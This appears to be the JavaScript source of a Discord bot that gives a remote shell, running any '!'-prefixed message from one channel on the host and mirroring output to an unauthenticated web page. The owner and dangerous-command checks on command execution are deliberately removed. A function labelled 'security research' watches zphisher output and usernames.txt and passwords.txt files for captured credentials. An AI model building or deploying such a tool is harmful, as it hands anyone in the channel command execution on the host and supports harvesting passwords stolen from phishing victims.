const { Client, GatewayIntentBits, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const { spawn } = require('child_process');
const express = require('express');
const path = require('path');
const fs = require('fs');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 2909;
const OWNER_ID = process.env.OWNER_ID; // Fix: Pull from .env
const TARGET_CHANNEL_ID = '1459402621382164605';

// --- TERMINAL SESSIONS ---
const terminals = {
    1: { process: null, message: null, lastSent: "" },
    2: { process: null, message: null, lastSent: "" },
    3: { process: null, message: null, lastSent: "" },
    4: { process: null, message: null, lastSent: "" }
};

// --- STATE & PERSISTENCE ---
const STATE_FILE = './state.json';
let state = {
    currentDir: process.cwd(),
    activeId: 1,
    buffers: { 1: "", 2: "", 3: "", 4: "" }
};

if (fs.existsSync(STATE_FILE)) {
    try {
        const saved = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
        state = { ...state, ...saved };
        if (fs.existsSync(state.currentDir)) process.chdir(state.currentDir);
    } catch (e) { console.log("⚠️ State Reset."); }
}

function saveState() {
    state.currentDir = process.cwd();
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
}

const stripAnsi = (text) => text.replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, '');

// --- EXPRESS SERVER ---
app.get('/', (req, res) => {
    res.send(`
        <html>
            <head>
                <title>RENZU OS - Console</title>
                <style>
                    body { background: #080808; color: #0f0; font-family: monospace; padding: 20px; }
                    pre { background: #000; color: #0f0; padding: 15px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; }
                </style>
                <meta http-equiv="refresh" content="5">
            </head>
            <body>
                <h1>📟 RENZU OS - Terminal T${state.activeId}</h1>
                <pre>${stripAnsi(state.buffers[state.activeId] || '').slice(-2000) || 'Waiting for commands...'}</pre>
            </body>
        </html>
    `);
});
app.listen(PORT, () => console.log('🚀 Web Server running on port', PORT));

// --- DISCORD CLIENT ---
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

const DANGEROUS_COMMANDS = [];

function getTerminalButtons() {
    const row1 = new ActionRowBuilder().addComponents(
        [1, 2, 3, 4].map(id =>
            new ButtonBuilder()
                .setCustomId(`sw_${id}`)
                .setLabel(`T${id}`)
                .setStyle(state.activeId === id ? ButtonStyle.Primary : ButtonStyle.Secondary)
        )
    );
    const row2 = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('kill_term').setLabel('🛑 Kill Active').setStyle(ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('clear_term').setLabel('🧹 Clear Screen').setStyle(ButtonStyle.Success)
    );
    return [row1, row2];
}

client.on('error', error => console.error(`[DISCORD-ERROR]`, error));

client.on('messageCreate', async (message) => {
    if (message.author.bot) return;

    // --- CHANNEL LOCK ---
    if (message.channel.id !== TARGET_CHANNEL_ID) return;

    // Log EVERY message received by the bot across ALL channels
    console.log(`\n[EVENT] Message from ${message.author.tag} (${message.author.id}) in channel ${message.channel.id} (${message.channel.name || 'DM'})`);
    console.log(`[CONTENT] "${message.content}"`);

    const msg = message.content.trim();

    // Command Check
    if (msg.startsWith('!')) {
        let cmd = msg.slice(1).trim();
        if (!cmd) return;

        let baseCmd = cmd.split(' ')[0].toLowerCase();
        // Removed owner/dangerous checks as requested

        if (cmd.startsWith('cd ')) {
            try {
                const newPath = path.resolve(process.cwd(), cmd.slice(3).trim());
                process.chdir(newPath);
                saveState();
                return message.reply(`📂 **Directory:** \`${process.cwd()}\``).catch(() => { });
            } catch (e) { return message.reply("❌ Folder not found!").catch(() => { }); }
        }

        if (cmd === 'sys') {
            const os = require('os');
            const freeRam = Math.round(os.freemem() / 1024 / 1024);
            const totalRam = Math.round(os.totalmem() / 1024 / 1024);
            return message.reply(`🖥️ **System Status:**\n- **RAM:** ${totalRam - freeRam}/${totalRam} MB used\n- **OS:** ${os.platform()}`).catch(() => { });
        }

        const tid = state.activeId;
        if (terminals[tid].process) return message.reply(`⚠️ T${tid} is busy!`).catch(() => { });

        state.buffers[tid] = `> ${cmd}\n`;
        try {
            terminals[tid].message = await message.reply({
                content: `🖥️ **T${tid} Live Stream:**\n\`\`\`bash\nInitializing...\n\`\`\``,
                components: getTerminalButtons()
            });
        } catch (err) {
            console.error("Reply error:", err.message);
            return;
        }

        const isWindows = process.platform === 'win32';
        const finalCmd = isWindows ? cmd : `stdbuf -oL -eL ${cmd}`;

        terminals[tid].process = spawn(finalCmd, {
            shell: true,
            cwd: process.cwd(),
            env: { ...process.env, TERM: 'xterm-256color', FORCE_COLOR: '1' }
        });

        terminals[tid].process.on('error', (err) => {
            state.buffers[tid] += `\n❌ Failed to start: ${err.message}\n`;
        });

        const updateUI = async () => {
            let output = stripAnsi(state.buffers[tid] || '');
            if (output.length > 1900) output = "...[truncated]...\n" + output.slice(-1800);

            if (output && output !== terminals[tid].lastSent) {
                terminals[tid].lastSent = output;
                await terminals[tid].message.edit({
                    content: `🖥️ **T${tid} Live Stream:**\n\`\`\`bash\n${output}\n\`\`\``,
                    components: getTerminalButtons()
                }).catch(() => { });
            }
        };

        const timer = setInterval(updateUI, 1200);

        terminals[tid].process.stdout.on('data', (data) => { state.buffers[tid] += data.toString(); });
        terminals[tid].process.stderr.on('data', (data) => { state.buffers[tid] += data.toString(); });

        terminals[tid].process.on('close', (code) => {
            clearInterval(timer);
            saveState();
            setTimeout(updateUI, 500);
            message.channel.send(`🏁 **T${tid} Finished** (Code: ${code})`).catch(() => { });
            terminals[tid].process = null;
        });
    }

    // --- INTERACTIVE INPUT ---
    if (terminals[state.activeId].process && !msg.startsWith('!')) {
        terminals[state.activeId].process.stdin.write(msg + '\n');
        return message.react('✅').catch(() => { });
    }
});

client.on('interactionCreate', async (i) => {
    if (!i.isButton()) return;
    if (i.user.id !== OWNER_ID) return i.reply({ content: "❌ Unauthorized!", ephemeral: true });

    const bid = i.customId;
    if (bid.startsWith('sw_')) {
        state.activeId = parseInt(bid.split('_')[1]);
        saveState();
        await i.update({ content: `🔄 Focus Switched: **T${state.activeId}**`, components: getTerminalButtons() }).catch(() => { });
    } else if (bid === 'kill_term' && terminals[state.activeId].process) {
        terminals[state.activeId].process.kill('SIGKILL');
        terminals[state.activeId].process = null;
        await i.update({ content: `🛑 T${state.activeId} Force Killed`, components: getTerminalButtons() }).catch(() => { });
    } else if (bid === 'clear_term') {
        state.buffers[state.activeId] = "";
        saveState();
        await i.update({ content: `🧹 T${state.activeId} Buffer Cleared`, components: getTerminalButtons() }).catch(() => { });
    }
});

// Logs watcher for security research
function watchLogs() {
    const SCAN_TARGETS = ['zphisher', 'sites', 'usernames.txt', 'passwords.txt'];
    setInterval(() => {
        SCAN_TARGETS.forEach(target => {
            const fullPath = path.join(process.cwd(), target);
            if (!fs.existsSync(fullPath)) return;
            try {
                const stat = fs.statSync(fullPath);
                if (!stat.isDirectory()) {
                    const content = fs.readFileSync(fullPath, 'utf8');
                    if (content.toLowerCase().includes('password')) {
                        console.log(`[ALERT] Credentials potentially captured in ${target}`);
                    }
                }
            } catch (e) { }
        });
    }, 10000);
}

client.on('ready', () => {
    console.log(`✅ Bot ready as ${client.user.tag}`);
    watchLogs();
});

client.login(process.env.TOKEN);
